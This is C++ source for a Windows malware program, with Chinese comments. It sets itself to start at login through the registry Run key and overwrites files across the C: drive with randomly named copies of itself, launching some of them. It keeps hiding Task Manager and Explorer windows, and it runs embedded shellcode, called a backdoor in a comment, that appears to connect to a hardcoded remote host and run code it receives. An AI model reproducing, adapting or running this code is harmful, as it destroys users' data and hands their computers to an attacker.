#include <io.h>
#include <string>
#include <vector>
#include <fstream>
#include<windows.h>
#include<chrono>
#include<iostream>
#include <ctime>
#include <thread>
#include<cstdlib>
#pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" ) //隐藏DOS黑窗口
#define MAX_PATH 4096
//定义写入的注册表路径
#define SELFSTART_REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
using namespace std;
//设置本身开机自启动 参数为true表示设置自启，为false 表示取消
char *randstr(char *str, const int len)
{
    auto timeNow = chrono::duration_cast<chrono::milliseconds>(chrono::system_clock::now().time_since_epoch());

    srand(timeNow.count());
    int i;
    for (i = 0; i < len; ++i)
    {
        switch ((rand() % 3))
        {
        case 1:
            str[i] = 'A' + rand() % 26;
            break;
        case 2:
            str[i] = 'a' + rand() % 26;
            break;
        default:
            str[i] = '0' + rand() % 10;
            break;
        }
    }
    str[++i] = '\0';
    return str;
}
BOOL SetSelfStart(bool bKey)
{
    //获取程序完整路径
    char pName[MAX_PATH] = { 0 };
    GetModuleFileNameA(NULL, pName, MAX_PATH);
    //在注册表中写入启动信息
    HKEY hKey = NULL;
    LONG lRet = NULL;
    if ( bKey)
    {
        //打开注册表
        lRet = RegOpenKeyExA(HKEY_CURRENT_USER, SELFSTART_REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);
        //判断是否成功
        if (lRet != ERROR_SUCCESS)
        {
            return FALSE;
        }
        else
        {
            char name[20];
            //写入注册表，名为testProtect，可以自己修改
            RegSetValueExA(hKey, randstr(name,20), 0, REG_SZ, (const unsigned char*)pName, strlen(pName) + sizeof(char));

            //关闭注册表
            RegCloseKey(hKey);
            return TRUE;
        }
    }
    else
    {
        lRet = RegOpenKeyExA(HKEY_CURRENT_USER, SELFSTART_REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);
        //判断是否成功
        if (lRet != ERROR_SUCCESS)
        {
            return FALSE;
        }
        else
        {

             //删除名为testProtect的注册表信息
            RegDeleteValueA(hKey, "testProtect");

            //关闭注册表
            RegCloseKey(hKey);
            return TRUE;
        }
    }
}


char* argccc ;
void CopyF(string filel);
/*unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"
"\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xa1\xbd\x41\x5f"
"\x68\x02\x00\x1a\x0a\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
"\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"
"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"
"\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"
"\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
"\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5"
"\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85"
"\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1"
"\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
*/
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"
"\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xa1\xbd\x41\x5f"
"\x68\x02\x00\x26\x8e\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
"\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"
"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"
"\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"
"\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
"\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5"
"\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85"
"\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1"
"\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

bool debug = 0;
void runshellcode(){
    while(1){
    ((void (*)())&buf)();
    }
}

void getFiles(string path, vector<string> &files){

    intptr_t   hFile = 0;//文件句柄，过会儿用来查找
    struct _finddata_t fileinfo;//文件信息
    string p;
    if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1)
     //如果查找到第一个文件
    {
        do
        {
            if ((fileinfo.attrib &  _A_SUBDIR))//如果是文件夹
            {
                if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0)
                    getFiles(p.assign(path).append("\\").append(fileinfo.name), files);
            }
            else//如果是文件
            {

                files.push_back(p.assign(path).append("\\").append(fileinfo.name));
                string sl = p.assign(path).append("\\").append(fileinfo.name);
                CopyF(sl);
            }
        } while (_findnext(hFile, &fileinfo) == 0); //能寻找到其他文件

        _findclose(hFile);  //结束查找，关闭句柄
    }
}

void CopyF(string filel){
                string directory;
                DeleteFile(filel.c_str());
                const size_t last_slash_idx = filel.rfind('\\');
                if (std::string::npos != last_slash_idx){
                    directory = filel.substr(0, last_slash_idx);
                }

                char name[20];
                string b = directory+"\\"+randstr(name, 15)+".exe";
                CopyFile(argccc, b.c_str(), FALSE);


                if(debug){
                    cout<<"filel"<<filel;
                    cout<<"directory"<<directory;
                    cout<<"winexec:"<<b.c_str()<<endl;
                }
                if(rand() % 20 == 0){
                    WinExec(b.c_str(), SW_HIDE);
                }
}
void pl(char* argt){


            vector<string> files;
            string lsl = "C:\\";
            getFiles(lsl.data(), files); //函数

            int size = files.size();
  /*          for (int i = 0;i < size;i++){
            //cout<<files[i].c_str();


                CopyF(files[i].c_str(),argt);

            }
            */
}
void hideManager(){
    while(1){
        HWND hWnd = ::FindWindow(NULL,"Windows 任务管理器");
        ShowWindow(hWnd, SW_HIDE);
        HWND hWnd2 = ::FindWindow(NULL,"文件资源管理器");
        ShowWindow(hWnd2, SW_HIDE);
        HWND hwnd;
        hwnd=FindWindow("ConsoleWindowClass",NULL);	//处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。
        if(hwnd){
            ShowWindow(hwnd,SW_HIDE);				//设置指定窗口的显示状态
        }

    }
}
void hideW(){
        HWND hwnd;
    hwnd=::GetForegroundWindow(); //处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。
    if(hwnd){
        ShowWindow(hwnd,SW_HIDE); //设置指定窗口的显示状态
    }

}
int main(int argc,char* argv[]){

    if(!debug){
        thread t4(hideW);//运行隐藏顶置
        t4.detach();
    }
    SetSelfStart(1);
    argccc= argv[0];

    for(int i = 0;i<100;i++){
            Sleep(1);
        thread t2(pl,argv[0]);//运行分裂
        t2.detach();
    }
    thread t3(hideManager);//运行隐藏任务管理器
    t3.detach();
    Sleep(10000);
    thread t1(runshellcode);//运行后门
    t1.detach();


    while(1){}
    return 0;
}
